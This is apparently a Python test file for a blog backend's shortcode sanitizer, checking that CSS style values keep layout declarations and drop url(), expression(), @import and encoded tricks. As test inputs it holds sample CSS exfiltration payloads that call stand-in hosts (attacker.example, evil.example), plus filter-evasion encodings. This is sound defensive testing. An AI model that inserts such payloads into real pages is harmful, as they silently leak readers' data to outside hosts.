"""短代码输出 style 属性的 CSS 白名单回归（审查 P2-10）。

修复前 `_ALLOWED_ATTRS["*"]` 放行 `style` 且**不检查值**，短代码 handler
只要返回 `<div style="background:url(https://attacker/?c=...)">` 就能在
订阅端 / 预览端静默外带数据；expression() / behavior 在旧引擎里还能执行脚本。
前端 `lib/sanitize.ts` 早已整体禁掉 style 属性，此处把后端收敛到同一口径：
保留纯排版声明，URL / 导入 / 表达式 / 编码痕迹一律丢弃。

注意这里**没有**把整段正文交给 `xss_filter.sanitize_html()`：那个 allowlist
只有 21 个标签，会剥掉 table/div/span/iframe 等现有文章排版，属于破坏性改动。
"""

from backend.core.shortcodes import (
    ShortcodeManager,
    _rewrite_attrs,
    _sanitize_style_value,
)


class TestCssValueAllowlist:
    def test_keeps_plain_layout_declarations(self):
        out = _sanitize_style_value("color: #fff; margin: 0 auto; text-align: center")
        assert out is not None
        assert "color: #fff" in out
        assert "margin: 0 auto" in out
        assert "text-align: center" in out

    def test_strips_url_exfiltration_declaration(self):
        out = _sanitize_style_value(
            "color: red; background-image: url('https://attacker.example/?c=secret')"
        )
        assert out == "color: red", "带 url() 的声明必须整条丢弃，合法声明要留下"

    def test_strips_expression_and_import(self):
        assert _sanitize_style_value("width: expression(alert(1))") is None
        assert _sanitize_style_value("@import url(https://evil.example/x.css)") is None

    def test_unknown_property_is_dropped(self):
        assert _sanitize_style_value("position: fixed; z-index: 9999") is None

    def test_encoded_payload_is_dropped(self):
        # CSS 里的反斜杠/实体/百分号编码常用于绕过关键字黑名单
        assert _sanitize_style_value("background: \\75 rl(https://evil/x)") is None
        assert _sanitize_style_value("color: &#106;avascript") is None


class TestRewriteAttrsIntegration:
    def test_safe_style_and_class_survive(self):
        out = _rewrite_attrs("div", ' class="box" style="color: red; text-align: center"')
        assert 'class="box"' in out
        assert "color: red" in out
        assert "text-align: center" in out

    def test_pure_malicious_style_attribute_is_dropped(self):
        out = _rewrite_attrs("div", ' style="background:url(https://evil.example/x)"')
        assert "style=" not in out
        assert "url(" not in out


class TestShortcodeRenderEndToEnd:
    @staticmethod
    def _render(html: str) -> str:
        sm = ShortcodeManager()

        def evil(**_):
            return html

        sm.register("evil", evil, plugin="demo")
        return sm.render("[evil /]")

    def test_url_exfiltration_never_reaches_output(self):
        result = self._render(
            '<div class="box" style="background:url(https://evil.example/?c=1); color: red">x</div>'
        )
        assert "url(" not in result
        assert "evil.example" not in result
        assert "<div" in result
        assert 'class="box"' in result
        assert "color: red" in result

    def test_pure_malicious_style_has_no_style_attribute(self):
        result = self._render('<div style="background:url(https://evil.example/x)">x</div>')
        assert "style=" not in result
        assert "<div>x</div>" in result
